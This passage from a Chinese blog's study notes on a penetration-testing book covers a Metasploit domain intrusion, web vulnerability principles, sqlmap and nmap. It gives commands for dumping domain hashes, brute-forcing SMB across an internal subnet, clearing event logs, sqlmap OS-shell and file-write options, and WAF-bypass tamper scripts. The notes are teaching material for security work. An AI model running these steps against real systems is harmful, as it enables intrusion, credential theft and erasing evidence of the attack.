10.51.0.64<br>run<br></code></pre></div></td></tr></table></figure><p>获取shell之后依旧进行进程迁移获取信息</p><p><strong>思路</strong>：可以看到现阶段控制的session共有5个。session1为WebShell反弹，session2利用ipc$入侵，渗透session4的目的是获取域管在线服务器，session5为域。整个渗透过程一环套一环,环环相扣</p><p>有了域控的权限,接着来抓Hash，常用方法有以下这几种</p><ul><li>使用Metasploit自带的dumphash或者smart_hashdump模块导出用户的Hash</li><li>利用PowerShell的相应模块导出Hash</li><li>使用WCE、Mimikatz等工具</li><li>其他方法</li></ul><p>这里使用了Metasploit自带的dumphash模块。需要注意，要想使用此模块导出Hash，必须有SYSTEM的权限才行,具体操作</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use post/windows/gather/smart_hashdump<br>show options<br><span class="hljs-built_in">set</span> session 5<br>run<br></code></pre></div></td></tr></table></figure><h2 id="6-8-SMB爆破内网"><a href="#6-8-SMB爆破内网" class="headerlink" title="6.8 SMB爆破内网"></a>6.8 SMB爆破内网</h2><p>有了域控的密码，现在在内网扩大权限具体操作</p><ol><li>利用当前获取的域控账户密码，对域控IP进行扫描</li><li>使用SMB下的smb_login模块</li><li>端口转发或者Socks代理进内网</li></ol><p>先在Metasploit添加路由，然后使用smb_login模块或者psexec_scanner模块进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_login<br><span class="hljs-built_in">set</span> rhost 10.51.0.1 /24<br><span class="hljs-built_in">set</span> smbuser **<br><span class="hljs-built_in">set</span> smbpass **<br><span class="hljs-built_in">set</span> smbdomain MEDABIL<br><span class="hljs-built_in">set</span> threads 16<br>creds<br></code></pre></div></td></tr></table></figure><p>我们获取了大量内网服务器的密码，下面就可以畅游内网了。可以使用Meterpreter的端口转发，也可以使用Metasploit下的Socks4a模块或者第三方软件。<br>这里简单地使用Meterpreter的端口转发即可</p><h2 id="6-9-清理日志"><a href="#6-9-清理日志" class="headerlink" title="6.9 清理日志"></a>6.9 清理日志</h2><p>清理日志主要有以下步骤</p><ol><li>删除之前添加的域管理账户</li><li>删除所有在渗透过程中使用过的工具</li><li>删除应用程序、系统和安全日志</li><li>关闭所有的Meterpreter连接</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ba"># shell下删除添加用户<br>net user sonicwalll /del<br>logoff<br># 删除日志 meter下<br>clearev<br># msf下关闭连接 sessions -k<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>书籍 Web安全攻防-渗透测试实战指南</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>Metasploit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试实战指南-Web安全原理解析</title>
    <link href="/2021/07/30/%E4%B9%A6%E7%B1%8D/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-Web%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
    <url>/2021/07/30/%E4%B9%A6%E7%B1%8D/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-Web%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Web安全原理解析"><a href="#Web安全原理解析" class="headerlink" title="Web安全原理解析"></a>Web安全原理解析</h1><p>部分实际操作内容与<code>代码审计：企业级Web代码安全架构</code>书籍部分重复，只记录原理</p><h1 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1. SQL注入"></a>1. SQL注入</h1><p>SQL注入产生条件</p><ul><li>参数用户可控：前端传给后端的参数内容是用户可以控制的</li><li>参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询</li></ul><h1 id="2-XSS漏洞"><a href="#2-XSS漏洞" class="headerlink" title="2. XSS漏洞"></a>2. XSS漏洞</h1><p>是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种</p><p>原理是允许恶意用户将代码注入网页，恶意用户可以利用XSS代码获取到很高的权限(如执行一些操作)、私密网页内容、会话和cookie等各种内容</p><p>XSS攻击可以分为三种：反射型、存储型和DOM型</p><ol><li><p>反射型XSS</p><p>通常是攻击者写好XSS代码后诱使目标用户点击</p></li><li><p>存储型XSS</p><p>攻击脚本将被永久地存放在目标服务器的数据库或文件中，通常在有内容存储的服务中</p></li><li><p>DOM型XSS</p><p>DOM型XSS是特殊类型的反射性XSS，相当于对HTML DOM进行修改而生成的XSS代码</p></li></ol><h1 id="3-CSRF-漏洞"><a href="#3-CSRF-漏洞" class="headerlink" title="3. CSRF 漏洞"></a>3. CSRF 漏洞</h1><p>原理：攻击者利用目标用户的身份，以目标用户的名义进行某些非法操作，包括但不限于，以目标用户的名义发邮件，消息，修改密码，虚拟货币转账</p><p>两个重点：</p><ol><li>目标用户已经登录对应网站，且对网站能够执行对应功能</li><li>目标用户访问了攻击者构造的URL</li></ol><p>如：诱使已登录对应网站的用户点击<a href="http://host:port/pay.php?user=admin&amp;money=100">http://host:port/pay.php?user=admin&amp;money=100</a></p><p>则目标用户可能会向用户admin转账100</p><h1 id="4-SSRF-漏洞"><a href="#4-SSRF-漏洞" class="headerlink" title="4. SSRF 漏洞"></a>4. SSRF 漏洞</h1><p>原理：服务端提供了从服务器应用获取数据的功能，且没有对目标地址进行严格的过滤与限制。</p><p>利用方式：</p><ol><li>对外网、服务器所在内网、本地端口进行扫描</li><li>攻击运行在内网或本地的应用程序</li><li>对内网Web应用进行指纹识别</li><li>利用file协议读取本地文件</li></ol><h1 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5.文件上传"></a>5.文件上传</h1><p>原理：在上传文件时，如果服务端代码未对客户端上传的文件进行严格的验证和过滤</p><h1 id="6-命令执行"><a href="#6-命令执行" class="headerlink" title="6. 命令执行"></a>6. 命令执行</h1><p>原理：服务端使用了可执行系统命令的函数，且函数内容攻击者可控</p><h1 id="7-逻辑漏洞点"><a href="#7-逻辑漏洞点" class="headerlink" title="7. 逻辑漏洞点"></a>7. 逻辑漏洞点</h1><p>经常出现逻辑漏洞的几类</p><ol><li>支付订单：可在客户端修改金额，数量且后端无验证</li><li>越权访问：未对用户的访问权限进行严格的限制</li><li>重置密码</li><li>竞争条件：同时进行购买，可能会两件都购买成功(但是只扣除一份的钱，或只有账户只有一件的钱现在扣为负数，或只购买了一件)</li></ol><h1 id="8-XXE漏洞"><a href="#8-XXE漏洞" class="headerlink" title="8. XXE漏洞"></a>8. XXE漏洞</h1><p>由于服务端读取了用户可控的传入的XML</p><h1 id="9-WAF"><a href="#9-WAF" class="headerlink" title="9. WAF"></a>9. WAF</h1><h2 id="9-1-介绍WAF"><a href="#9-1-介绍WAF" class="headerlink" title="9.1 介绍WAF"></a>9.1 介绍WAF</h2><p>Web应用防火墙是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品</p><p>一般可分为以下几类</p><ol><li><p>软件型WAF<br>以软件形式装在所保护的服务器上的WAF，由于安装在服务器上，所以可以接触到服务器上的文件，直接检测服务器上是否存在WebShell、是否有文件被创建等</p></li><li><p>硬件型WAF<br>以硬件形式部署在链路中，支持多种部署方式，当串联到链路中时可以拦截恶意流量，在旁路监听模式时只记录攻击不进行拦截</p></li><li><p>云WAF<br>一般以反向代理的形式工作，通过配置NS记录或CNAME记录，使对网站的请求报文优先经过WAF主机，经过WAF主机过滤后，将认为无害的请求报文再发送给实际网站服务器进行请求，可以说是带防护功能的CDN</p></li><li><p>网站系统内置的WAF<br>网站系统内置的WAF也可以说是网站系统中内置的过滤，直接镶嵌在代码中，相对来说自由度高，一般有以下这几种情况</p><ul><li>输入参数强制类型转换(intval等)</li><li>输入参数合法性检测</li><li>关键函数执行(SQL执行、页面显示、命令执行等)前，对经过代码流程的输入进行检测</li><li>对输入的数据进行替换过滤后再继续执行代码流程(转义/替换掉特殊字符等)</li></ul></li></ol><p>网站系统内置的WAF与业务更加契合，在对安全与业务都比较了解的情况下，可以更少地收到误报与漏报</p><h2 id="9-2-WAF-判断"><a href="#9-2-WAF-判断" class="headerlink" title="9.2 WAF 判断"></a>9.2 WAF 判断</h2><ol><li><p>SQLMap判断</p><p>以下命令进行判断</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://host:port&quot;</span> --identify-waf --batch<br></code></pre></div></td></tr></table></figure></li><li><p>手工判断</p><p>查看返回界面，以及响应内容</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>书籍 Web安全攻防-渗透测试实战指南</category>
      
    </categories>
    
    
    <tags>
      
      <tag>书籍</tag>
      
      <tag>安全原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透测试实战指南-常用工具</title>
    <link href="/2021/07/29/%E4%B9%A6%E7%B1%8D/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    <url>/2021/07/29/%E4%B9%A6%E7%B1%8D/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="常用的渗透测试工具"><a href="#常用的渗透测试工具" class="headerlink" title="常用的渗透测试工具"></a>常用的渗透测试工具</h1><h1 id="1-sqlmap-详解"><a href="#1-sqlmap-详解" class="headerlink" title="1. sqlmap 详解"></a>1. sqlmap 详解</h1><h2 id="1-1-SQLMap-入门"><a href="#1-1-SQLMap-入门" class="headerlink" title="1.1 SQLMap 入门"></a>1.1 SQLMap 入门</h2><h3 id="1-1-1-判断是否存在注入点"><a href="#1-1-1-判断是否存在注入点" class="headerlink" title="1.1.1 判断是否存在注入点"></a>1.1.1 判断是否存在注入点</h3><p>判断是否存在注入命令如下</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap -u http://host:port/web/?id=1<br><span class="hljs-comment"># 当注入尝试大于等于两个时需要添加双引号</span><br>sqlmap -u <span class="hljs-string">&quot;http://host:port/web/?id=1&amp;uid=2&quot;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-1-2-判断文本中的请求是否存在注入"><a href="#1-1-2-判断文本中的请求是否存在注入" class="headerlink" title="1.1.2 判断文本中的请求是否存在注入"></a>1.1.2 判断文本中的请求是否存在注入</h3><p>将请求的HTTP包拦截后放入txt中，也可以进行注入，且不用设置其他参数(如Cookie，POST等)</p><p>判断命令如下</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap tmp.txt<br><span class="hljs-comment"># -r一般在存在cookie注入时使用</span><br>sqlmap -r tmp.txt<br></code></pre></div></td></tr></table></figure><h3 id="1-1-3-进一步查询内容"><a href="#1-1-3-进一步查询内容" class="headerlink" title="1.1.3 进一步查询内容"></a>1.1.3 进一步查询内容</h3><p>命令如下</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 查询所有数据库</span><br>sqlmap -u http://host:port/web/?id=1 --dbs<br><span class="hljs-comment"># 查询数据库下的表名 -D 数据库名</span><br>sqlmap -u http://host:port/web/?id=1 -D web --tables<br><span class="hljs-comment"># 查询表中的字段名 -T 表名</span><br>sqlmap -u http://host:port/web/?id=1 -D web -T user --columns<br><span class="hljs-comment"># 查询字段内容</span><br>sqlmap -u http://host:port/web/?id=1 -D web -T user -C username,pw --dump<br></code></pre></div></td></tr></table></figure><h3 id="1-1-4-获取数据库内容"><a href="#1-1-4-获取数据库内容" class="headerlink" title="1.1.4 获取数据库内容"></a>1.1.4 获取数据库内容</h3><ol><li><p>获取数据库的所有用户</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 当用户有权限读取用户表时可以列出所有管理用户</span><br>sqlmap -u <span class="hljs-string">&quot;http://host:port/web/?id=1&quot;</span> --users<br></code></pre></div></td></tr></table></figure></li><li><p>获取数据库用户密码</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 同上需要对应权限才能获取</span><br>sqlmap -u <span class="hljs-string">&quot;http://host:port/web/?id=1&quot;</span> --passwords<br></code></pre></div></td></tr></table></figure></li><li><p>获取当前网站数据库的名称</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://host:port/web/?id=1&quot;</span> --current-db<br></code></pre></div></td></tr></table></figure></li><li><p>获取当前网站数据库的名称</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://host:port/web/?id=1&quot;</span> --current-user<br></code></pre></div></td></tr></table></figure></li></ol><h2 id="1-2-SQLMap进阶：参数讲解"><a href="#1-2-SQLMap进阶：参数讲解" class="headerlink" title="1.2 SQLMap进阶：参数讲解"></a>1.2 SQLMap进阶：参数讲解</h2><ol><li><p>–level 5：探测等级</p><p>参数 –level 5指需要执行的测试等级，一共有5个等级(1~5)，可不加level，默认是1</p><p>SQLMap使用的Payload可以在xml/payloads.xml中看到，也可以根据相应的格式添加自己的Payload，其中5级包含的Payload最多，会自动破解出cookie、XFF等头部注入。当然,level 5的运行速度也比较慢</p><p>这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTPcookie在level为2时就会测试，HTTP User-Agent/Referer头在level为3时就会测试</p><p>总之，在不确定哪个Payload或参数为注入点时，为了保证全面性，建议使用高的level值</p></li><li><p>–is-dba：当前用户是否为管理权限</p><p>如果命令返回TRUE这为管理员权限</p></li><li><p>–riles：列出数据库管理员角色</p></li><li><p>–referer：HTTP Referer头</p></li><li><p>–sql-shell：运行自定义SQL语句</p></li><li><p>–os-cmd,–os-shell：运行任意操作系统命令</p><p>在数据库为MySQL、 PostgreSQL或Microsoft SQL Server，并且当前用户有权限使用特定的函数时</p><p>如数据库为MySQL、PostgreSQL，SQLMap上传一个二进制库，包含用户自定义的函数sys_exec ()和sys_eval ()，那么创建的这两个函数就可以执行系统命令。</p><p>用–os-shell参数可以模拟一个真实的Shell，输入想执行的命令。当不能执行多语句时(比如PHP或ASP的后端数据库为MySQL)，仍然可以使用INTOOUTFILE写进可写目录，创建一个Web后门。–os-shell支持ASP、ASP.NET、JSP和PHP四种语言(要想执行改参数，需要有数据库管理员权限，也就是–is-dba的值要为True)</p></li><li><p>–file-read：从数据库服务器中读取文件</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://host:port/web/?id=1&quot;</span> --file-read <span class="hljs-string">&quot;C://tmp.txt&quot;</span> -v 1<br></code></pre></div></td></tr></table></figure></li><li><p>–file-write,–file-dest：上传文件道数据库服务器中</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://host:port/web/?id=1&quot;</span> --file-write <span class="hljs-string">&quot;tmp.txt&quot;</span> --file-dest <span class="hljs-string">&quot;c://tmp.txt&quot;</span> -v 1<br></code></pre></div></td></tr></table></figure></li></ol><h2 id="1-3-SQLMap自带绕过脚本tamper的讲解"><a href="#1-3-SQLMap自带绕过脚本tamper的讲解" class="headerlink" title="1.3 SQLMap自带绕过脚本tamper的讲解"></a>1.3 SQLMap自带绕过脚本tamper的讲解</h2><p>常见的tamper脚本(使用方法<code>sqlmap ***** --tamper &quot;模块名&quot;</code>)</p><ul><li><p>apostrophemask.py </p><p>将引号替换为UTF-8，用于过滤单引号</p></li><li><p>base64encode.py</p><p>替换为base64编码</p></li><li><p>multiplespaces.py</p><p>围绕SQL关键字添加多个空格</p></li><li><p>space2plus.py</p><p>用+号替换空格</p></li><li><p>nonrecursivereplacement.py</p><p>用双重语句替代预定义的SQL关键字</p></li><li><p>space2randomblank.py</p><p>将空格替换为其他有效字符</p></li><li><p>unionalltounion.py</p><p>将UNION ALL SELECT 替换为 UNIION SELECT</p></li><li><p>securesphere.py</p><p>追加特制的字符串</p></li><li><p>space2hash.py</p><p>将空格替换为#号,并添加一个随机字符串和换行符</p></li><li><p>space2mssqlblank.py</p><p>将空格替换为其他符号</p></li><li><p>between.py</p><p>用NOT BETWEEN 0 AND替换大于号(&gt;)，用BETWEEN AND替换等于(=)</p></li><li><p>percentage.py</p><p>ASP允许在每个字符前面添加一个%号</p></li><li><p>sp_password.py</p><p>从DBMS日志的自动模糊处理的有效符合中追加sp_password</p></li><li><p>charencode.py</p><p>对给定的Payload全部支付使用URL编码</p></li><li><p>randomcase.py</p><p>随机大小写</p></li><li><p>charunicodeencode.py</p><p>字符串unicode编码</p></li><li><p>space2comment.py</p><p>将空格替换为/**/</p></li><li><p>equaltolike.py</p><p>将等号替换为like</p></li><li><p>greatest.py</p><p>绕过对‘&gt;’的过滤，用GREATEST替换大于号</p></li><li><p>modesecurityversioned.py</p><p>过滤空格，使用MySQL内联注释的方式进行注入</p></li><li><p>modesecurityzeroversioned.py</p><p>使用MySQL内联注释的方式（/*!00000*/）进行注入</p></li><li><p>space2mysqldash.py</p><p>将空格替换为——,并添加一个换行符</p></li><li><p>bluecoat.py</p><p>在SQL语句之后用有效的随机空白符替换空格符，随后用LIKE替换等于号</p></li><li><p>versionedkeywords.py</p><p>注释绕过</p></li><li><p>halfversionedmorekeywords.py</p><p>当数据库为MySQL时绕过防火墙，在每个关键字之前添加MySQL版本注释</p></li><li><p>space2morehash.py</p><p>将空格替换为#号，并添加一个随机字符串和换行符</p></li><li><p>apostrophenullencode.py</p><p>用非法双字节unicode字节替换单引号</p></li><li><p>appendnullbyte.py</p><p>在有效负荷的结束位置加载零字节字符编码</p></li><li><p>chardoubleencode.py</p><p>对给定的的Payload全部支付使用双重URL编码</p></li><li><p>unmagicquotes.py</p><p>用一个多字节组合(%bf%27)和末尾通用注释一起替换空格</p></li><li><p>randomcomments.py</p><p>用/**/分割关键字</p></li></ul><h1 id="2-nmap-详解"><a href="#2-nmap-详解" class="headerlink" title="2. nmap 详解"></a>2. nmap 详解</h1><h2 id="2-1-Nmap入门"><a href="#2-1-Nmap入门" class="headerlink" title="2.1 Nmap入门"></a>2.1 Nmap入门</h2><h3 id="2-1-1-扫描参数"><a href="#2-1-1-扫描参数" class="headerlink" title="2.1.1 扫描参数"></a>2.1.1 扫描参数</h3><p>输入<code>nmap --help</code>查看帮助文档</p><p>Nmap相关参数</p><ul><li>-iL：从文件中导入目标主机或目标网段</li><li>-iR：随机选择目标主机</li><li>–exclude：后面跟的主机或网段将不在扫描范围内</li><li>–excludefile：导入文件中的主机或网段将不在扫描范围中</li></ul><p>与主机发现方法相关的参数如下</p><ul><li>-sL：List Scan (列表扫描)，仅列举指定目标的IP，不进行主机发现</li><li>-sn：Ping Scan,只进行主机发现，不进行端口扫描</li><li>-Pn：将所有指定的主机视作已开启，跳过主机发现的过程</li><li>-PS/PA/PU/PY [portlist]：使用TCP SYN/ACK或SCTP INIT/ECHO方式<br>  来发现</li><li>-PE/PP/PM：使用ICMP echo、timestamp. netmask请求包发现主机</li><li>-PO [protocollist] ：使用IP协议包探测对方主机是否开启</li><li>-n/-R：-n表示不进行DNS解析; -R表示总是进行DNS解析</li><li>–dns-servers&lt;serv1 [，serv2] ，…..&gt;指定DNS服务器</li><li>–system-dns：指定使用系统的DNS服务器</li><li>–traceroute：追踪每个路由节点</li></ul><p>与常见的端口扫描方法相关的参数如下</p><ul><li>-sS/sT/sA/sW/sM：指定使用TCP SYN/Connect () /ACK/Window/Maimon scans的方式对目标主机进行扫描</li><li>-sU：指定使用UDP扫描的方式确定目标主机的UDP端口状况</li><li>-sN/sF/sX：指定使用TCP Nul/FIN/Xmas scans秘密描的方式协助探测对方的TCP端口状态</li><li>–scanflags &lt;flags&gt;：定制TCP包的flags</li><li>-sl&lt;zombie host [: probeport] &gt;：指定使用Idle scan的方式扫描目标主机(前提是需要找到合适的zombie host)</li><li>-sY/sZ：使用SCTP INIT/COOKIE ECHO扫描SCTP协议端口的开放情况</li><li>-sO：使用IP protocol扫描确定目标机支持的协议类型</li><li>-b&lt;FTP relay host&gt;：使用FTP bounce scan扫描方式</li></ul><p>跟端口参数与扫描顺序的设置相关的参数如下</p><ul><li><p>-p&lt;port ranges&gt;：扫描指定的端口</p></li><li><p>-F：Fast mode(快速模式)，仅扫描TOP 100的端口</p></li><li><p>-r：不进行端口随机打乱的操作(如无该参数，Nmap会将要扫描的端口以随机顺序的方式进行扫描，让Nmap的扫描不易被对方防火墙检测到)</p></li><li><p>–top-ports&lt;number&gt;：扫描开放概率最高的number个端口(Nmap的作者曾做过大规模的互联网扫描，以此统计网络上各种端口可能开放的概率，并排列出最有可能开放端口的列表，具体可以参见nmap-services文件。默认情况下，Nmap会扫描最有可能的1000个TCP端口)</p></li><li><p>–port-ratio&lt;ratio&gt;：扫描指定频率以上的端口。与上述–top-ports类似，这里以概率作为参数，概率大于–port-ratio的端口才被扫描。显然参数必须在0～1之间，想了解具体的概率范围可以查看nmap-services文件</p></li></ul><p>与版本侦测相关的参数如下所示</p><ul><li>-sV：指定让Nmap进行版本侦测</li><li>–version-intensity&lt;level&gt;：指定版本侦测的强度(0~9)，默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长</li><li>–version-light：指定使用轻量级侦测方式(intensity 2) </li><li>–version-all：尝试使用所有的probes进行侦测(intensity 9) </li><li>–version-trace：显示出详细的版本侦测过程信息</li></ul><h3 id="2-1-2-常用方法"><a href="#2-1-2-常用方法" class="headerlink" title="2.1.2 常用方法"></a>2.1.2 常用方法</h3><ol><li><p>扫描单个目标地址</p><p>在Nmap后直接添加目标地址即可</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap 192.168.1.1<br></code></pre></div></td></tr></table></figure></li><li><p>扫描多个目标地址</p><p>数量不多可以且在同一个网段可直接之后欠佳</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap 192.168.1.1 192.168.1.5<br></code></pre></div></td></tr></table></figure></li><li><p>扫描一个范围内的目标地址</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap 192.168.0.1-110<br></code></pre></div></td></tr></table></figure></li><li><p>扫描网段</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap 192.168.0.0/24<br></code></pre></div></td></tr></table></figure></li><li><p>扫描文本内容</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap -iL targets.txt<br></code></pre></div></td></tr></table></figure></li><li><p>扫描除一个目标外的其它目标</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap 192.168.0.100/24-exclude 192.168.0.105<br></code></pre></div></td></tr></table></figure></li><li><p>扫描除某一文件中的目标地址外的目标地址</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap 192.168.0.100/24-excludefile targets.txt<br></code></pre></div></td></tr></table></figure></li><li><p>扫描某一目标的部分端口</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap 192.168.0.100 -p 21,22,80<br></code></pre></div></td></tr></table></figure></li><li><p>对目标地址进行路由跟踪</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap --traceroute 192.168.0.100<br></code></pre></div></td></tr></table></figure></li><li><p>扫描目标地址所在C端的在线情况</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap -sP 192.168.0.100/24<br></code></pre></div></td></tr></table></figure></li><li><p>目标地址的操作系统指纹识别</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap -O 192.168.0.105<br></code></pre></div></td></tr></table></figure></li><li><p>目标地址提供的服务版本检测</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">nmap -sV 192.168.0.105<br></code></pre></div></td></tr></table></figure></li><li><p>探测防火墙状态</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># 使用FIN扫描方式探测防火墙的状态</span><br>nmap -sF -T4 192.168.0.100<br></code></pre></div></td></tr></table></figure></li><li><p>状态识别</p><p>常见状态</p><table><thead><tr><th>状态</th><th>含义</th></tr></thead><tbody><tr><td>open</td><td>开放的，表示应用程序正在监听端口的连接，外部可以访问</td></tr><tr><td>filtered</td><td>被过滤的，表示端口被防火墙或其它网络设置阻止，不能访问</td></tr><tr><td>closed</td><td>关闭的，表示目标主机未开启该端口</td></tr><tr><td>unfiltered</td><td>未被过滤的，表示Nmap无法确定端口所处状态，需进一步探测</td></tr><tr><td>open/filtered</td><td>开放的或被过滤的，Nmap不能识别</td></tr><tr><td>closed/filtered</td><td>关闭的或被过滤的，Nmap不能识别</td></tr></tbody></table></li></ol><h3 id="2-1-3-Nmap进阶"><a href="#2-1-3-Nmap进阶" class="headerlink" title="2.1.3 Nmap进阶"></a>2.1.3 Nmap进阶</h3><p>Nmap的脚本默认在/xx/nmap/scripts文件下</p><h4 